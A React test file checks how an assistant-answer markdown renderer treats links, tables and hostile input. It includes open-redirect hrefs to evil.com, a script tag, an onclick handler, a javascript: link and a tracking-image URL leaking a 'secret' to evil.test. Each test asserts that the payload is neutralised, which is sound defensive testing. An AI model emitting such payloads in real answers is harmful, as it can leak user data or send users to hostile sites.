import type { ReactNode } from "react";
import { describe, expect, it, vi } from "vitest";

import { AssistantMarkdown } from "./AssistantMarkdown";

import { fireEvent, render, screen } from "@testing-library/react";

describe(AssistantMarkdown.name, () => {
  it("renders markdown and opens links in a new tab without a handle back to Console", () => {
    setup({ markdown: "Read **the docs** at [Akash](https://akash.network/docs)." });

    expect(screen.getByText("the docs").tagName).toBe("STRONG");
    const link = screen.getByRole("link", { name: "Akash" });
    expect(link).toHaveAttribute("href", "https://akash.network/docs");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  it("navigates to a deployment in the same tab", () => {
    const { navigateInApp } = setup({ markdown: "Your [web app](/deployments/24151788) is running." });

    const link = screen.getByRole("link", { name: "web app" });
    fireEvent.click(link);

    expect(navigateInApp).toHaveBeenCalledWith("/deployments/24151788");
    expect(link).toHaveAttribute("href", "/deployments/24151788");
    expect(link).not.toHaveAttribute("target");
    expect(link).not.toHaveAttribute("rel");
  });

  it.each(["/deployments", "/templates", "/templates/akash-network-awesome_akash-comfyui", "/alerts", "/billing", "/usage"])(
    "navigates to %s in the same tab",
    href => {
      const { navigateInApp } = setup({ markdown: `[page](${href})` });

      fireEvent.click(screen.getByRole("link", { name: "page" }));

      expect(navigateInApp).toHaveBeenCalledWith(href);
    }
  );

  it.each([
    "//evil.com",
    "//evil.com/deployments/1",
    "/\\evil.com",
    "https://console.akash.network/deployments/1",
    "evil.com/deployments/1",
    "/deployments/1/../../evil",
    "/deployments/1?next=//evil.com",
    "/deployments/1x",
    "/deployments/abc",
    "x/templates/a",
    "/templates/a.b",
    "/templates/a/b",
    "/alertsx",
    "/billing/x",
    "/xusage"
  ])("opens %j in a new tab without a handle back to Console", href => {
    setup({ markdown: `[page](<${href}>)` });

    const link = screen.getByRole("link", { name: "page" });

    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  it("renders GitHub flavored tables", () => {
    setup({ markdown: "| Lease | State |\n| --- | --- |\n| 1 | active |" });

    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(screen.getByRole("cell", { name: "active" })).toBeInTheDocument();
  });

  it("never renders raw HTML or images an answer names", () => {
    const { container } = setup({
      markdown: '<script>window.ran = true</script><b onclick="x()">bold</b>\n\n![tracker](https://evil.test/pixel?secret=1) after'
    });

    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container).toHaveTextContent("after");
  });

  it("makes javascript links inert and opens them in a new tab", () => {
    setup({ markdown: "[click](javascript:alert(1))" });

    const link = screen.getByText("click").closest("a");

    expect(link).toHaveAttribute("href", "javascript:void(0)");
    expect(link).toHaveAttribute("target", "_blank");
  });

  function setup(input: { markdown: string }) {
    const navigateInApp = vi.fn();
    const Link = ({ href, children, ...rest }: { href: string; children: ReactNode }) => (
      <a
        href={href}
        {...rest}
        onClick={event => {
          event.preventDefault();
          navigateInApp(href);
        }}
      >
        {children}
      </a>
    );

    const result = render(<AssistantMarkdown dependencies={{ Link }}>{input.markdown}</AssistantMarkdown>);

    return { ...result, navigateInApp };
  }
});
